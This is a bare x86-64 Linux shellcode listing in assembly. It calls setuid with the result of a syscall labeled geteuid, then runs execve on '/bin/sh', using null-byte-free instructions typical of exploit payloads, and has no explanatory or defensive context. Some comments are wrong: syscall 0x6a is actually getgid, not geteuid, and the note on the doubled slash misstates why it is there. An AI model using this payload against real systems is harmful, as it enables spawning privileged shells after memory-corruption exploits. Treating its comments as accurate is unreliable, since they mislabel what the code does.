section .text
    global _start

_start:
    ; setuid(geteuid())
    xor rax, rax        ; rax = 0
    mov al, 0x6a        ; syscall number for geteuid
    syscall             ; geteuid()
    mov rdi, rax        ; move returned UID to rdi
    xor rax, rax        ; rax = 0
    mov al, 0x69        ; syscall number for setuid
    syscall             ; setuid(geteuid())

    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax        ; rax = 0
    mov al, 0x3b        ; syscall number for execve
    xor rdi, rdi        ; rdi = 0
    push rdi            ; NULL terminator
    mov rdi, 0x68732f6e69622f2f ; "//bin/sh" (double slash to ensure null termination)
    push rdi
    mov rdi, rsp        ; pointer to "/bin/sh"
    xor rsi, rsi        ; argv = NULL
    xor rdx, rdx        ; envp = NULL
    syscall             ; execve("/bin/sh", NULL, NULL)
